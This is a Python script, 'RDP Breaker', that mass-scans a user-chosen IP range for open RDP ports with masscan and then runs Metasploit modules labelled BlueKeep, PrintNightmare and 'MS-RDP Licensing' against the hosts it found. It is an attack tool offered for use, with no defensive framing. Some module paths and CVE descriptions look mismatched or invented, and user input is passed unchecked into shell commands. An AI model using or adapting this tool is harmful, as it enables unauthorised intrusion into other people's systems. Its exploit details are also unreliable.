#!/usr/bin/env python3

import subprocess
import re
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# ASCII art
ASCII_TEXT = r'''
  ____  ____  ____     ____                  __            
 / __ \/ __ \/ __ \   / __ )________  ____ _/ /_____  _____
/ /_/ / / / / /_/ /  / __  / ___/ _ \/ __ `/ //_/ _ \/ ___/
/ _, _/ /_/ / ____/  / /_/ / /  /  __/ /_/ / ,< /  __/ /    
/_/ |_|\____/_/      /_____/_/   \___/\__,_/_/|_|\___/_/     
'''

# Color codes
CYAN = Fore.CYAN
GREEN = Fore.GREEN
RED = Fore.RED

def print_color(color, message):
    print(f"{color}{message}")

def run_command(command, capture_output=True):
    try:
        if capture_output:
            return subprocess.check_output(command, shell=True, text=True)
        else:
            subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print_color(RED, f"Error: {e}")

def get_ip_addresses(output):
    return re.findall(r'(?<=Host: )\S+', output)

def main():
    print_color(CYAN, ASCII_TEXT)

    print_color(GREEN, "Select the tool you want to use:")
    print("1: masscan")
    print("2: metasploit")

    tool_choice = input("Enter the number corresponding to your choice: ")

    if tool_choice == "1":
        masscan_file = input("Enter the file name to save masscan results (e.g., rdp_masscan.txt): ")
        ip_range = input("Enter the IP range to scan (e.g., 192.168.1.0/24): ")
        run_command(f"masscan -p3389 {ip_range} --rate 10000 --exclude 255.255.255.255 -oG {masscan_file}")
        masscan_output = run_command(f"cat {masscan_file}")
        rdp_hosts = get_ip_addresses(masscan_output)
        with open("rdp.txt", "w") as rdp_file:
            rdp_file.write("\n".join(rdp_hosts))

    elif tool_choice == "2":
        print("Available Metasploit Exploits:")
        print("1: CVE-2019-0708 BlueKeep")
        print("2: CVE-2021-34527 PrintNightmare")
        print("3: CVE-2021-36942 MS-RDP Licensing")
        exploit_choice = input("Enter the number corresponding to the exploit you want to run: ")

        if exploit_choice == "1":
            num_rdp_hosts = input("Enter the number of RDP hosts you want to fetch: ")
            rdp_file = input("Enter the file name containing the list of RDP hosts (e.g., rdp.txt): ")
            if not rdp_file:
                print_color(RED, "Error: The specified file does not exist or is empty.")
            else:
                print(f"Running Metasploit BlueKeep exploit on the first {num_rdp_hosts} hosts from {rdp_file}...")
                run_command(f"msfconsole -q -x \"use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS file:{rdp_file}; run\"")

        elif exploit_choice == "2":
            rdp_file = input("Enter the file name containing the list of RDP hosts (e.g., rdp.txt): ")
            if not rdp_file:
                print_color(RED, "Error: The specified file does not exist or is empty.")
            else:
                print(f"Running Metasploit PrintNightmare exploit on the provided RDP hosts from {rdp_file}...")
                run_command(f"msfconsole -q -x \"use exploit/windows/rdp/cve_2021_34527_printnightmare; set RHOSTS file:{rdp_file}; run\"")

        elif exploit_choice == "3":
            rdp_file = input("Enter the file name containing the list of RDP hosts (e.g., rdp.txt): ")
            if not rdp_file:
                print_color(RED, "Error: The specified file does not exist or is empty.")
            else:
                print(f"Running Metasploit MS-RDP Licensing exploit on the provided RDP hosts from {rdp_file}...")
                run_command(f"msfconsole -q -x \"use exploit/windows/rdp/cve_2021_36942_msrdp_licensing; set RHOSTS file:{rdp_file}; run\"")

        else:
            print_color(RED, "Invalid choice. Please enter a valid exploit number.")

    else:
        print_color(RED, "Invalid choice. Please enter either '1' or '2' corresponding to your choice.")

if __name__ == "__main__":
    main()

